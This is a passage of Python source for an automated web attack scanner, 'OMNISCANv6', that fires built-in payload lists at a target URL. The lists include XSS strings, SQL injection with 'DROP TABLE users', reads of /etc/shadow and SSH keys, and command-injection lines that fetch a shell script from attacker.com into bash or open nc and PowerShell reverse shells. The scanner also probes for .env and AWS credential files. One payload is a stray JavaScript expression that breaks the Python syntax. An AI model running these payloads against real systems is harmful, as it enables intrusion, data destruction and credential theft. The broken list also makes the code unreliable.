    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))

# ══════════════════════════════════════════════════════════════════════════════
#  SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class OMNISCANv6:

    def __init__(self, target_url, threads=15, timeout=10, tests=None, quiet=False, brain=None):
        self.target_url  = target_url
        self.max_workers = threads
        self.timeout     = timeout
        self.quiet       = quiet
        self.tests       = tests or {k:True for k in ['xss','sqli','path','cmdi','lfi','idor','info','http']}
        self.brain       = brain or load_brain()

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        })
        self.verifier  = Verifier(self.session, self.timeout)
        self._lock     = threading.Lock()
        self._seen_keys = set()

        self.vulnerabilities      = []
        self.discovered_endpoints = []
        self.technologies         = []
        self.logs                 = []
        self.start_time           = time.time()

        # ── Base (built-in) payloads ──────────────────────────
        self._builtins = {
            'xss': [
            # Basic script tags
            '<script>alert(1)</script>',
            '<script>alert(document.cookie)</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>prompt(1)</script>',
            '<script>confirm(1)</script>',
            '<script>javascript:alert(1)</script>',
            '<script src="data:text/javascript,alert(1)"></script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        
        # IMG tags
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert(document.domain)>',
        '<img src=x onerror=alert(document.cookie)>',
        '<img src="x" onerror="alert(1)">',
        '<img src=x: onerror=alert(1)>',
        '<img src="x" onerror="javascript:alert(1)">',
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        
        # SVG
        '<svg onload=alert(1)>',
        '<svg onload=alert(document.cookie)>',
        '<svg/onload=alert(1)>',
        '<svg onload=alert(String.fromCharCode(88,83,83))>',
        '<svg><script>alert(1)</script></svg>',
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
        
        # Event handlers
        '<details open ontoggle=alert(1)>',
        '<details open ontoggle=alert(document.cookie)>',
        '<audio src=x onerror=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<keygen autofocus onfocus=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)">',
        
        # HTML5 elements
        '<form><button formaction="javascript:alert(1)">Click</button></form>',
        '<isindex action="javascript:alert(1)" type=image>',
        '<body onscroll=alert(1) style="height:2000px">',
        
        # Advanced bypasses
        '"\'><script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        'javascript:alert(1)',
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */alert(1)//)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:msgbox(1)',
        'javascript:alert(1)//<svg/onload=alert(1)>',
        
        # Filter bypasses
        '<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
        '<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62),
        '<scr%00ipt>alert(1)</script>',
        '<script>alert(1)</scr%00ipt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<sCrIpT>alert(1)</sCrIpT>',
        
        # DOM XSS
        '" autofocus onfocus=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) x=',
        '"><iframe src="javascript:alert(1)">',
        'javascript:alert(1)',
        'data:,<svg onload=alert(1)>',
        
        # Polyglot payloads
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '<svg/onload=alert(String.fromCharCode(88,83,83))>',
        '""><script>alert(1)</script>',
        '\';alert(String.fromCharCode(88,83,83))//',
        
        # More advanced
        '<img src="x" onerror="window.onerror=alert;throw 1">',
        '<svg xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)">',
        '<style>@import\'javascript:alert(1)\';</style>',
        '<style>.a{background:url(javascript:alert(1))}</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<base href="javascript:alert(1)//">',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)"></embed>',
        '<form action="javascript:alert(1)"><input type=submit>',
        
        # Encoding bypasses
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%253Cscript%253Ealert(1)%253C/script%253E',
        '&#x3Cscript&#x3Ealert(1)&#x3C/script&#x3E',
        '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;',
        
        # Template injection
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(1)}',
        '<%=alert(1)%>',
        '<%eval("alert(1)")%>',
        
        # More payloads (continuing to 100+)
        '<link rel="import" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        '<table background="javascript:alert(1)"></table>',
        '<xmp><svg onload=alert(1)></xmp>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '" onmouseover="alert(1)" onmouseout="alert(1)" style="position:absolute"',
        # ... (continuing pattern with variations)
        ] + [f'<img src=x onerror=alert({i})>' for i in range(1, 20)] + 
        [f'<script>alert("{chr(i)}")</script>' for i in range(65, 91)] +  # A-Z
        [f'<svg onload=alert("{i}")></svg>' for i in range(100, 120)],  # 100-119
    
    'sqli_error': [
        # Basic
        "'", '"', "`", "''", '""', "''''",
        "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", "' OR 'x'='x",
        "1' OR '1'='1", "1' OR 1=1--", "admin'--", "admin' #",
        "1 OR 1=1", "1 OR 1=1--", "1 OR 1=1#", "' OR ''='",
        
        # UNION
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,user()--",
        "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
        "1' UNION SELECT 1,2,3--", "1 UNION SELECT 1,database(),3--",
        
        # MySQL specific
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())))--",
        "1 AND (SELECT 1 FROM (SELECT SLEEP(5))A)",
        
        # MSSQL
        "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--",
        "'; DECLARE @q varchar(99);SET @q=CAST(DB_NAME() AS varchar(99));PRINT @q;--",
        "1; WAITFOR DELAY '0:0:5'--",
        
        # PostgreSQL
        "'; SELECT pg_sleep(5)--", "1; SELECT 1; SELECT pg_sleep(5)--",
        
        # Oracle
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT UTL_INADDR.GET_HOST_ADDRESS('1.1.1.1') FROM DUAL))--",
        
        # Stacked queries
        "'; DROP TABLE users--", "; DROP TABLE users--",
        "'; SELECT * FROM users--", "1; SELECT * FROM users--",
        
        # Boolean based
        "' AND 1=1--", "' AND 1=2--", "AND 1=1", "AND 1=2",
        "' AND SUBSTRING(version(),1,1)='5",
        
        # Error based advanced
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND ASCII(SUBSTRING(@@version,1,1))>64 AND '1'='1",
        "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT)--",
        
        # Time-based variations
        "' AND IF(1=1,SLEEP(5),0)--",
        "1' AND IF(ASCII(SUBSTRING(database(),1,1))=115,1,SLEEP(5))--",
        
        # File read
        "1' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
        
        # More (100+ total)
        ] + [f"' OR 1={i}--" for i in range(1, 50)] + 
        [f"' UNION SELECT {i},NULL,NULL--" for i in range(1, 30)],

    'sqli_time': [
        # MySQL
        ("MySQL", "' AND SLEEP(5)--", 5),
        ("MySQL", "1' AND SLEEP(5)--", 5),
        ("MySQL", "1 AND SLEEP(5)", 5),
        ("MySQL", "' AND IF(1=1,SLEEP(5),0)--", 5),
        ("MySQL", "1' AND IF(1=1,SLEEP(5),0)--", 5),
        ("MySQL", "' OR SLEEP(5)--", 5),
        ("MySQL", "(SELECT * FROM (SELECT(SLEEP(5)))a)", 5),
        
        # MSSQL
        ("MSSQL", "'; WAITFOR DELAY '0:0:5'--", 5),
        ("MSSQL", "1; WAITFOR DELAY '0:0:5'--", 5),
        ("MSSQL", "; WAITFOR TIME '00:00:05'--", 5),
        
        # PostgreSQL
        ("PostgreSQL", "'; SELECT pg_sleep(5)--", 5),
        ("PostgreSQL", "1; SELECT pg_sleep(5)--", 5),
        
        # Oracle
        ("Oracle", "'; BEGIN DBMS_LOCK.SLEEP(5); END;--", 5),
        ("Oracle", "1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99),5)=1--", 5),
        
        # SQLite
        ("SQLite", "'; SELECT * FROM (SELECT SLEEP(5))--", 5),
        
        # Variations
        ("MySQL", "' AND BENCHMARK(10000000,MD5(1))--", 5),
        ("MySQL", "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--", 5),
    ],

    'path_traversal': [
        # Unix/Linux
        '../../../etc/passwd',
        '../../../../../../etc/passwd',
        '/etc/passwd',
        '../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '....\\....\\....\\etc\\passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '/.%00./.%00./.%00./etc/passwd',
        '/../../../../../../../../etc/passwd',
        '/etc/././././././passwd',
        
        # Windows
        '..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....\\....\\windows\\win.ini',
        '%c0%ae%c0%ae%c0%afwindows\\win.ini',
        '\\\\?\\C:\\windows\\win.ini',
        '..%5c..%5c..%5cwindows%5cwin.ini',
        
        # Null byte
        '../../../../etc/passwd%00',
        '/etc/passwd%00',
        '../../../etc/passwd%00',
        
        # Double encoding
        '%252e%252e%252fetc%252fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        
        # Unicode
        '%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd',
        
        # Other files
        '/proc/version',
        '/proc/self/environ',
        '/proc/self/cmdline',
        '/proc/self/status',
        '/etc/hosts',
        '/etc/shadow',
        'C:\\boot.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        
        # PHP wrappers
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'expect://id',
        'zip://../test.zip%23shell.php',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
    ],

    'command_injection': [
        # Basic separators
        ';id', '|id', '`id`', '$(id)', ';whoami', '|whoami',
        ';cat /etc/passwd', '& whoami &', '&& whoami', '; uname -a',
        
        # Advanced
        ';curl http://attacker.com/shell.sh|bash',
        '|curl http://attacker.com/shell.sh|bash',
        '`curl http://attacker.com/shell.sh|bash`',
        '$(curl http://attacker.com/shell.sh|bash)',
        ';wget -q -O- http://attacker.com/shell.sh|bash',
        ';nc -e /bin/sh attacker.com 4444',
        '|nc -e /bin/bash attacker.com 4444',
        
        # Windows
        ';whoami /all', '&& dir', '| dir', '`dir`', '$(dir)',
        ';net user', '&& net user', '| type C:\\windows\\win.ini',
        ';powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
        
        # Encoding bypass
        ';${IFS}id', ';$(id)', ';${PATH//:/ }id',
        ';cat${IFS}/etc/passwd', '|nc${IFS}-e${IFS}/bin/bash${IFS}attacker.com${IFS}4444',
        
        # PHP
        ';<?php system(id); ?>', ';<?php passthru(id); ?>',
        '${PATH//:/ }whoami', ';echo${IFS}Y2F0${IFS}fGVjL3Bhc3N3ZA==|base64${IFS}-d',
        
        # URL encoding
        '%3bid%3e', '%7cid%7c', '%60id%60', '%24%28id%29',
        
        # More complex
        ';for i in `ls`;do mv $i `echo $i|sed 's/x$/x.bak/'`;done',
        ';cat /etc/*release*',
        ';ps aux',
        ';env',
        ';export',
        ';history',
        ';last',
    ],

    'lfi': [
        '../../../../etc/passwd',
        '../../etc/passwd',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '/proc/self/environ',
        '/proc/version',
        '/proc/self/cmdline',
        '../../../../etc/passwd%00',
        '/etc/passwd%00',
        
        # PHP wrappers
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/read=convert.base64-encode/resource=index.php',
        'php://filter/convert.quoted-printable-encode/resource=index.php',
        'php://input',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
        'expect://whoami',
        'zip://../test.zip%23shell.php',
        
        # Null byte + traversal
        '../../../../etc/passwd%00.jpg',
        '../../../../../etc/passwd%00.png',
        
        # Double encoding
        '..%2f..%2f..%2fetc%2fpasswd',
        '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        
        # Apache logs
        '/proc/self/fd/0',
        '/proc/self/fd/1',
        '/proc/self/fd/2',
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/usr/local/apache/logs/access_log',
        
        # Other sensitive files
        '/etc/hosts',
        '/etc/shadow',
        '/root/.ssh/id_rsa',
        '/home/user/.ssh/id_rsa',
        '/var/www/html/config.php',
        '/var/www/config.php',
        'C:\\xampp\\htdocs\\config.php',
        
        # Session files
        '/tmp/sess_[session_id]',
        '/var/lib/php/sessions/sess_[session_id]',
    ]
}

        # Build adaptive queues using brain
        self.payloads = {
            pt: brain_build_payload_queue(self.brain, pt, self._builtins[pt])
            for pt in ['xss','sqli_error','path_traversal','command_injection','lfi']
        }
        self.payloads['sqli_time'] = self._builtins['sqli_time']

        self.common_endpoints = [
            '/','admin','/login','/register','/api','/wp-admin',
            '/config.php','/.env','/phpinfo.php','/robots.txt',
            '/backup','/debug','/console','/dashboard','/upload',
            '/uploads','/files','/search','/api/v1','/wp-login.php',
            '/wp-config.php','/phpmyadmin','/adminer',
            '/.git/HEAD','/.git/config','/server-status',
            '/api/users','/api/admin','/graphql','/swagger.json',
            '/openapi.json','/api-docs','/actuator/env',
            '/composer.json','/package.json','/requirements.txt',
            '/.env.local','/.env.production','/.env.backup',
            '/web.config','/sitemap.xml','/.well-known/security.txt',
        ]

        self.sensitive_files = [
            '/.env','/.env.local','/.env.production','/.env.backup',
            '/config.php','/config.json','/config.yml','/web.config',
            '/appsettings.json','/phpinfo.php','/info.php',
            '/.git/HEAD','/.git/config','/.svn/entries',
            '/backup.sql','/database.sql','/dump.sql',
            '/error.log','/debug.log','/access.log',
            '/credentials.json','/secrets.json','/.ssh/id_rsa',
            '/private.pem','/wp-config.php','/wp-config.php.bak',
            '/database.sqlite','/db.sqlite3',
            '/composer.json','/composer.lock','/package.json',
            '/swagger.json','/openapi.json','/.aws/credentials',
            '/Jenkinsfile','/.gitlab-ci.yml','/terraform.tfvars',
        ]

        # Show brain intel for this domain
        intel = self.brain["domain_profiles"].get(urlparse(target_url).netloc, {})
        if intel:
            self._log(f"Brain intel — known techs: {intel.get('techs',[])[:3]}  "
                      f"prior vuln types: {intel.get('vuln_types',[])[:3]}", 'ai')

    # ── Logging ───────────────────────────────────────────────
    def _log(self, msg, level='info'):
        ts = datetime.now().strftime('%H:%M:%S')
        col = {'info':FG_GREY,'success':FG_GREEN,'warning':FG_YELLOW,
               'error':FG_RED,'ai':FG_PURPLE,'endpoint':FG_PINK}.get(level, FG_GREY)
        icon = {'info':'ℹ','success':'✔','warning':'⚠','error':'✖',
                'ai':'◈','endpoint':'◉'}.get(level,'·')
        self.logs.append({'time':ts,'message':msg,'level':level})
        if not self.quiet or level in ('warning','error','success','ai'):
            print(f"  {FG_GREY}[{ts}]{RST} {col}{BOLD}{icon}{RST} {col}{msg}{RST}")

    def _print_finding(self, vuln):
        s   = vuln.get('severity','INFO').upper()
        col = SEV_FG.get(s, FG_WHITE)
        bg  = {k:v for k,v in [('CRITICAL',BG_RED),('HIGH',BG_ORANGE)]}.get(s,'')
        conf = vuln.get('confidence',100)
        origin = vuln.get('payload_origin','builtin')
        phase_tag = {
            'winner': f"{FG_PURPLE}[WINNER]{RST}",
            'mutant': f"{FG_PINK}[MUTANT]{RST}",
            'builtin': f"{FG_GREY}[BUILTIN]{RST}",
        }.get(origin, '')

        sep = f"  {FG_GREY}{'─'*68}{RST}"
        print(sep)
        if bg:
            print(f"  {bg}{FG_WHITE}{BOLD}  ★ {s} — {vuln.get('type','')}  {RST} {phase_tag}  {FG_GREEN}Confidence: {conf}%{RST}")
        else:
            print(f"  {col}{BOLD}★ [{s}]{RST} {FG_WHITE}{BOLD}{vuln.get('type','')}{RST}  {phase_tag}  {FG_GREEN}{conf}%{RST}")
        print(f"  {FG_GREY}URL    :{RST}  {_fmt_url(vuln.get('url',''))}")
        if vuln.get('parameter'):
            print(f"  {FG_GREY}Param  :{RST}  {FG_PINK}{BOLD}{vuln['parameter']}{RST}")
        if vuln.get('payload'):
            print(f"  {FG_GREY}Payload:{RST}  {FG_RED}{vuln['payload'][:95]}{RST}")
        if vuln.get('evidence'):
            print(f"  {FG_GREY}Evidence:{RST} {FG_YELLOW}{vuln['evidence'][:95]}{RST}")
        print(f"  {FG_GREY}Verified:{RST} {FG_GREEN}✔ {vuln.get('verify_passes',0)}/3 checks passed{RST}")
        print(sep)

    def _progress(self, stage, pct, extra=''):
        if not self.quiet:
            sys.stdout.write(f"\r  {_bar(pct)}  {FG_GREY}{stage[:45]:<45}{RST}  {extra}")
            sys.stdout.flush()
        if pct >= 100:
            print()

    def _req(self, url, method='GET', timeout=None, **kw):
        try:
            r = self.session.request(method, url, timeout=timeout or self.timeout,
                                     verify=False, allow_redirects=True, **kw)
            time.sleep(0.04)
            return r
        except Exception:
            return None

    # ── Dedup + enrich + verify add ───────────────────────────
    def _add_verified(self, vuln: dict):
        """Only adds finding if it passes dedup AND has been pre-verified."""
        key = _vuln_key(vuln)
        with self._lock:
            if key in self._seen_keys:
                return
            self._seen_keys.add(key)
        vuln['severity'] = vuln.get('severity','MEDIUM').upper()
        cat = VULN_DETAILS.get(vuln.get('type',''), {})
        vuln.update({
            'cwe':cat.get('cwe',''),'owasp':cat.get('owasp',''),
            'description':cat.get('description',''),'impact':cat.get('impact',''),
            'remediation':cat.get('remediation',[]),'references':cat.get('references',[]),
            'steps':_steps(vuln),
        })
        with self._lock:
            self.vulnerabilities.append(vuln)
        self._print_finding(vuln)

        # Promote to brain winner
        ptype_map = {
            'Cross-Site Scripting (XSS)':'xss',
            'SQL Injection':'sqli_error',
            'Blind SQL Injection (Time-Based)':'sqli_error',
            'Path Traversal':'path_traversal',
            'Command Injection':'command_injection',
            'Local File Inclusion (LFI)':'lfi',
        }
        ptype = ptype_map.get(vuln.get('type',''))
        if ptype and vuln.get('payload'):
            brain_promote_winner(self.brain, ptype, vuln['payload'], origin='scan_confirmed')

    def _targets(self, defaults):
        scores = self.brain.get("param_scores", {})
        ordered = sorted(defaults, key=lambda p: scores.get(p, 0), reverse=True)
        t = set()
        for p in ordered:
            t.add((self.target_url, p))
        for ep in self.discovered_endpoints:
            for p in ep.get('params', []):
                t.add((ep['url'], p))
        return list(t)

    def _payload_origin(self, payload, ptype):
        winners = self.brain["payload_winners"].get(ptype, {})
        mutants  = self.brain["payload_mutants"].get(ptype, [])
        if payload in winners:
            return 'winner'
        if payload in mutants:
            return 'mutant'
        return 'builtin'

    # ──────────────────────────────────────────────────────────
    #  Endpoint Discovery  (clean — no false endpoints)
    # ──────────────────────────────────────────────────────────
    def _discover(self):
        self._progress("Discovering endpoints …", 3)
        seen, found = set(), []
        target_host = urlparse(self.target_url).netloc

        # Only these status codes mean an endpoint genuinely exists
        VALID_STATUSES = {200, 201, 204, 206, 301, 302, 307, 308, 401, 403, 500}

        # Static asset extensions — never real navigable endpoints
        SKIP_EXT = {
            '.jpg','.jpeg','.png','.gif','.svg','.ico','.webp','.bmp',
            '.css','.woff','.woff2','.ttf','.eot','.otf',
            '.js','.map','.mp4','.mp3','.pdf','.zip','.gz','.tar',
        }

        # href prefixes that are never URLs
        SKIP_PREFIXES = ('javascript:', 'mailto:', 'tel:', '#', 'data:', 'void(', '//')

        def _norm(url):
            """Canonical form for dedup: strip fragment, trailing slash."""
            p = urlparse(url)
            path = p.path.rstrip('/') or '/'
            return urlunparse((p.scheme, p.netloc, path, '', p.query, ''))

        def _is_valid(url, status, ct, size):
            if status not in VALID_STATUSES:
                return False
            ext = os.path.splitext(urlparse(url).path)[1].lower()
            if ext in SKIP_EXT:
                return False
            # 401/403 with trivially small body = catch-all block, not a real endpoint
            if status in (401, 403) and size < 150:
                return False
            return True

        def add(info):
            norm = _norm(info['url'])
            if norm in seen:
                return
            seen.add(norm)
            info['url'] = norm
            found.append(info)
            sc = info['status']
            col = (FG_GREEN if sc in (200,201,204,206)
                   else FG_YELLOW if sc in (301,302,307,308)
                   else FG_ORANGE if sc in (401,403)
                   else FG_GREY)
            ct_short = info.get('content_type','').split(';')[0][:28]
            self._log(
                f"{col}[{sc}]{RST} {FG_PINK}{norm}{RST}  "
                f"{FG_GREY}{ct_short}  {info.get('size',0):,}B{RST}",
                'endpoint'
            )

        # ── 1. Target homepage ────────────────────────────────
        r = self._req(self.target_url)
        if r and r.status_code < 500:
            ct = r.headers.get('content-type', '')
            add({'url': self.target_url, 'status': r.status_code,
                 'size': len(r.content), 'content_type': ct, 'params': []})

            # ── 2. Scrape <a href> links from homepage only ───
            for link in re.findall(r'<a[^>]+href=[\'"]?([^\'" >#][^\'" >]*)', r.text, re.IGNORECASE):
                if any(link.startswith(p) for p in SKIP_PREFIXES):
                    continue
                full = urljoin(self.target_url, link)
                pu   = urlparse(full)
                if pu.netloc != target_host:
                    continue
                ext = os.path.splitext(pu.path)[1].lower()
                if ext in SKIP_EXT:
                    continue
                if not pu.path or pu.path == '/':
                    continue
                params = list(parse_qs(pu.query).keys()) if pu.query else []
                add({'url': f"{pu.scheme}://{pu.netloc}{pu.path}",
                     'status': 200, 'size': 0,
                     'content_type': 'text/html', 'params': params})

        # ── 3. Probe common paths ─────────────────────────────
        def probe(path):
            url  = urljoin(self.target_url, path)
            norm = _norm(url)
            if norm in seen:
                return None
            resp = self._req(url)
            if not resp:
                return None
            status = resp.status_code
            ct     = resp.headers.get('content-type', '')
            size   = len(resp.content)
            if not _is_valid(url, status, ct, size):
                return None
            # Redirect looping back to / is noise
            if status in (301, 302, 307, 308):
                loc = resp.headers.get('location', '')
                dest_path = urlparse(urljoin(url, loc)).path if loc else ''
                if dest_path in ('', '/'):
                    return None
            return {'url': url, 'status': status,
                    'size': size, 'content_type': ct, 'params': []}

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futs = {ex.submit(probe, ep): ep for ep in self.common_endpoints}
            done = 0
            for fut in concurrent.futures.as_completed(futs):
                done += 1
                self._progress(
                    f"Probing ({done}/{len(self.common_endpoints)})",
                    3 + int(done / len(self.common_endpoints) * 9)
                )
                res = fut.result()
                if res:
                    add(res)

        self.discovered_endpoints = found
        ok   = sum(1 for e in found if e['status'] in (200,201,204,206))
        auth = sum(1 for e in found if e['status'] in (401,403))
        redir= sum(1 for e in found if e['status'] in (301,302,307,308))
        self._log(
            f"Discovery done — {FG_WHITE}{BOLD}{len(found)}{RST}{FG_GREEN} endpoints  "
            f"({FG_GREEN}{ok} OK{RST}  {FG_YELLOW}{redir} redirect{RST}  {FG_ORANGE}{auth} auth-protected{RST})",
            'success'
        )

    # ──────────────────────────────────────────────────────────
    #  Technology fingerprint
    # ──────────────────────────────────────────────────────────
    def _fingerprint(self):
        self._progress("Technology fingerprinting …", 13)
        r = self._req(self.target_url)
        if not r: return
        techs, h, body = [], r.headers, r.text.lower()
        for hdr in ['server','x-powered-by','x-aspnet-version','x-generator']:
            if h.get(hdr): techs.append(f"{hdr.title()}: {h[hdr]}")
        patterns = {
            'WordPress':['wp-content','wp-includes'],'Laravel':['laravel_session'],
            'React':['data-reactroot'],'Vue.js':['__vue__'],
            'Angular':['ng-version'],'jQuery':['jquery.min.js'],
            'Bootstrap':['bootstrap.min.css'],'ASP.NET':['__viewstate','.aspx'],
            'PHP':['.php','phpsessid'],'Python/Flask':['werkzeug'],
            'Nginx':['nginx'],'Apache':['apache'],
        }
        for tech, pats in patterns.items():
            if any(p in body or any(p in v.lower() for v in h.values()) for p in pats):
                if tech not in techs: techs.append(tech)
        missing = [sh for sh in ['content-security-policy','x-content-type-options',
                                   'x-frame-options','strict-transport-security']
                   if sh not in {k.lower() for k in h}]
        if missing: techs.append(f"Missing headers: {', '.join(missing)}")
        self.technologies = techs
        self._log(f"Detected {len(techs)} technologies/indicators", 'success')

    # ──────────────────────────────────────────────────────────
    #  XSS  (with 3-stage verification)
    # ──────────────────────────────────────────────────────────
    def _test_xss(self):
        if not self.tests.get('xss'): return
        targets = self._targets(['q','search','name','s','query','keyword','term','input','text','msg'])
        queue   = self.payloads['xss']
        total, done = len(targets)*len(queue), [0]
        ptype = 'xss'

        def test(url, param, payload):
            test_url = _inject_url(url, param, payload)
            resp = self._req(test_url)
            if not resp or payload not in resp.text: return None
            encoded = payload.replace('<','&lt;').replace('>','&gt;')
            if encoded in resp.text and payload not in resp.text.replace(encoded,''): return None

            confirmed, conf, passes = self.verifier.verify_xss(test_url, param, payload, resp)
            if not confirmed: return None

            return {'type':'Cross-Site Scripting (XSS)','url':test_url,'parameter':param,
                    'payload':payload,'severity':'HIGH','evidence':payload[:80],
                    'details':f'Payload reflected unencoded via "{param}"',
                    'confidence':conf,'verify_passes':passes,
                    'payload_origin':self._payload_origin(payload, ptype)}

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futs = [ex.submit(test,u,p,pl) for u,p in targets for pl in queue]
            for fut in concurrent.futures.as_completed(futs):
                done[0] += 1
                origin_info = f"{FG_PURPLE}W{RST}" if done[0] <= len(self.brain['payload_winners'].get(ptype,{})) else ""
                self._progress(f"XSS ({done[0]}/{total})", 18+int(done[0]/max(total,1)*9), origin_info)
                r = fut.result()
                if r: self._add_verified(r)

    # ──────────────────────────────────────────────────────────
    #  SQLi
    # ──────────────────────────────────────────────────────────
    def _test_sqli(self):
        if not self.tests.get('sqli'): return
        targets = self._targets(['id','uid','pid','cat','page','user','q','search','item'])
        error_pats = [
            (r"you have an error in your sql syntax","MySQL"),
            (r"warning: mysql","MySQL"),
            (r"unclosed quotation mark","MSSQL"),
            (r"pg_query\(\).*error","PostgreSQL"),
            (r"sqlite3?\.operationalerror","SQLite"),
            (r"ora-\d{5}","Oracle"),
            (r"sql syntax.*mysql|mysql.*sql syntax","MySQL"),
            (r"division by zero","Generic"),
            (r"syntax error.*near","Generic"),
        ]
        queue = self.payloads['sqli_error']
        total, done = len(targets)*len(queue), [0]
        ptype = 'sqli_error'

        def test_err(url, param, payload):
            test_url = _inject_url(url, param, payload)
            resp     = self._req(test_url)
            if not resp: return None
            body = resp.text.lower()
            for pat, db in error_pats:
                m = re.search(pat, body)
                if m:
                    confirmed, conf, passes = self.verifier.verify_sqli(test_url, param, payload, pat, resp)
                    if not confirmed: return None
                    start = max(0, m.start()-30)
                    return {'type':'SQL Injection','url':test_url,'parameter':param,'payload':payload,
                            'severity':'CRITICAL','db_type':db,'evidence':body[start:m.start()+100].strip(),
                            'details':f'{db} SQL error via "{param}"',
                            'confidence':conf,'verify_passes':passes,
                            'payload_origin':self._payload_origin(payload, ptype)}
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futs = [ex.submit(test_err,u,p,pl) for u,p in targets for pl in queue]
            for fut in concurrent.futures.as_completed(futs):
                done[0] += 1
                self._progress(f"SQLi error-based ({done[0]}/{total})", 27+int(done[0]/max(total,1)*8))
                r = fut.result()
                if r: self._add_verified(r)

        # Time-based (serial)
        self._progress("SQLi time-based …", 36)
        for url, param in targets[:5]:
            for db, payload, delay in self.payloads['sqli_time']:
                test_url = _inject_url(url, param, payload)
                t0 = time.time()
                self._req(test_url, timeout=delay+8)
                elapsed = time.time()-t0
                if elapsed >= delay-0.5:
                    # Verify: repeat and check timing again
                    t1 = time.time()
                    self._req(test_url, timeout=delay+8)
                    e2 = time.time()-t1
                    if e2 >= delay-0.5:
                        self._add_verified({'type':'Blind SQL Injection (Time-Based)','url':test_url,
                            'parameter':param,'payload':payload,'severity':'CRITICAL','db_type':db,
                            'evidence':f'Delayed {elapsed:.1f}s and {e2:.1f}s on 2 requests',
                            'details':f'Time-based blind SQLi via "{param}" ({db})',
